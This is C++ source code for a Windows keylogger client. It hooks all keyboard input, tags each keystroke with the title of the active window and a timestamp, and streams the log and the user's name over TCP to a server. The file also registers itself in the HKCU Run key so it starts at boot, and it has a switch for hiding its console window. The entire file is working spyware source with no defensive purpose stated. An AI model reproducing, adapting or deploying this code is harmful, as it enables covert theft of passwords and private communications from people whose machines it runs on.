#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <SFML/Network.hpp>
#include <lmcons.h>
// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

#define EQUAL 187
#define COMMA 188
#define DOT1 110
#define DOT2 190
#define APOSTROPHE 222
#define BACKSLASH 220
#define FORSLASH1 111
#define FORSLASH2 191
#define DASH1 189	
#define DASH2 109
#define STAR 106
#define PLUS 107
#define SEMICOLON 186
#define CLOSE_BRACKET 221
#define OPEN_BRACKET 219
#define DIACRITIAL_MARK 192


// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, const char *file);

extern char lastwindow[256];


sf::TcpSocket sckt;
// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.

void sendData(std::string &data);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode, "Log.txt");
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, const char *file)
{
	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	else if (key_stroke == 160 || key_stroke == 161)
		return 0;


	std::string data = "";

	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm *tm = NULL;
			tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			TCHAR name[UNLEN + 1];
			DWORD size = UNLEN + 1;

			GetUserName((TCHAR*)name, &size);
			data += "\n\n[WINDOW: " + std::string(window_title) + " - at " + std::string(s) + " ]  Key = ";
			/*data += "UserName = " + std::string(name);
			data += "Ip ="   Key =  "*/
		}
	}


	if (GetAsyncKeyState(VK_SHIFT))
	{

	}

	if (key_stroke == VK_BACK)
	{
		data += "[BACKSPACE]";
	}
	else if (key_stroke == VK_RETURN)
	{
		data += "[ENTER]";
	}
	else if (key_stroke == VK_SPACE)
	{
		data += "[SPACE]";
		sckt.disconnect();
		return 1;
	}
	else if (key_stroke == VK_TAB)
	{
		data += "[TAB]";
	}

	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
	{
		data += "[CONTROL]";
	}
	else if (key_stroke == VK_ESCAPE)
	{
		data += "[ESCAPE]";
	}
	else if (key_stroke == VK_END)
	{
		data += "[END]";
	}
	else if (key_stroke == VK_HOME)
	{
		data += "[HOME]";
	}
	else if (key_stroke == VK_LEFT)
	{
		data += "[LEFT]";
	}
	else if (key_stroke == VK_UP)
	{
		data += "[UP]";
	}
	else if (key_stroke == VK_RIGHT)
	{
		data += "[RIGHT]";
	}
	else if (key_stroke == VK_DOWN)
	{
		data += "[DOWN]";
	}
	else if (key_stroke == STAR)
	{
		data += "[ * ]";
	}
	else if (key_stroke == PLUS)
	{
		data += "[ + ]";
	}
	else if (key_stroke == DOT1 || key_stroke == DOT2)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ . ]";
		else
			data += "[ > ]";
	}
	else if (key_stroke == COMMA)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ , ]";
		else
			data += "[ < ]";
	}
	else if (key_stroke == FORSLASH1 || key_stroke == FORSLASH2)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ / ]";
		else
			data += "[ ? ]";
	}
	else if (key_stroke == DASH1 || key_stroke == DASH2)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ - ]";

		else
			data += "[ _ ]";
	}
	else if (key_stroke == EQUAL)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ = ]";
		else
			data += "[ + ]";
	}
	else if (key_stroke == OPEN_BRACKET)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ [ ]";
		else
			data += "[ { ]";
	}
	else if (key_stroke == CLOSE_BRACKET)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ ] ]";
		else
			data += "[ } ]";
	}
	else if (key_stroke == BACKSLASH)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ BACKSLASH ]";
		else
			data += "[ | ]";
	}
	else if (key_stroke == SEMICOLON)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ ; ]";
		else
			data += "[ : ]";
	}
	else if (key_stroke == APOSTROPHE)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ ' ]";
		else
			data += "[ \" ]";
	}
	else if (key_stroke == DIACRITIAL_MARK)
	{
		if (!GetAsyncKeyState(VK_SHIFT))
			data += "[ ` ]";
		else
			data += "[ ~ ] OR [ ~~ ]";
	}

	else if (key_stroke == 20)
	{
		data += "[CAPSLOCK]";
	}
	else if (key_stroke >= 96 && key_stroke <= 105)
	{
		char buff[33];
		data += _itoa(key_stroke - 96, buff, 10);
	}

	else {

		if (key_stroke >= 48 && key_stroke <= 58) // 0-9
		{
			if (GetAsyncKeyState(VK_SHIFT))
			{
				char numMarks[10] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
				data += numMarks[key_stroke - 48];
			}
			else
				data += char(key_stroke);
		}

		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
														 // check caps lock
			bool capsLock = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			if (GetAsyncKeyState(VK_SHIFT))
			{
				capsLock = !capsLock;
			}
			

			if (!capsLock)
			{
				key_stroke += 32;
			}

			data += (char)key_stroke;
		}
	}

	std::cout << data << "  " << std::endl;

	sendData(data);

	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

void connect()
{
	sf::IpAddress ip = sf::IpAddress::getLocalAddress(); //narazei bo serwer mam na localu na tej samej maszynie :|

	
	while (sckt.connect(ip, 2000) != sf::Socket::Done)
	{
		std::cerr << "Nie mozna sie polaczyc z serwerem " << std::endl;
		Sleep(4000);
	}

	std::cout << "Polaczono z serwerem ! \n";

	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	GetUserName((TCHAR*)name, &size);
	std::string sourceInfo = std::string(name) + " " + sckt.getRemoteAddress().toString();

	if (sckt.send(sourceInfo.c_str(), sourceInfo.size() + 1) == sf::Socket::Done)
	{
		std::cout << "Wyslano informacje " << std::endl;
	}

}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = DWORD((wcslen(szValue) + 1) * 2);
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
}

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}


int main()
{	
	//visibility of window
	Stealth();

	//Register program
	RegisterProgram();
	IsMyProgramRegisteredForStartup(L"My_Program");

	std::cout << "Welcome to Client" << std::endl;
	

	//connection
	connect();

	 //Set the hook
	SetHook();


	//loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}

	std::cout << "Rozlaczanie z serwerem \n";
	sckt.disconnect();

	return 0;
}

void sendData(std::string &data)
{
	if (sckt.send(data.c_str(), data.size() + 1) != sf::Socket::Done)
	{
		std::cerr << "Nie udalo sie wyslac pakietu ! " << std::endl;
		sckt.disconnect();
		connect();
		return;
	}
	
	std::cout << "Wyslano pakiet ! \n";
}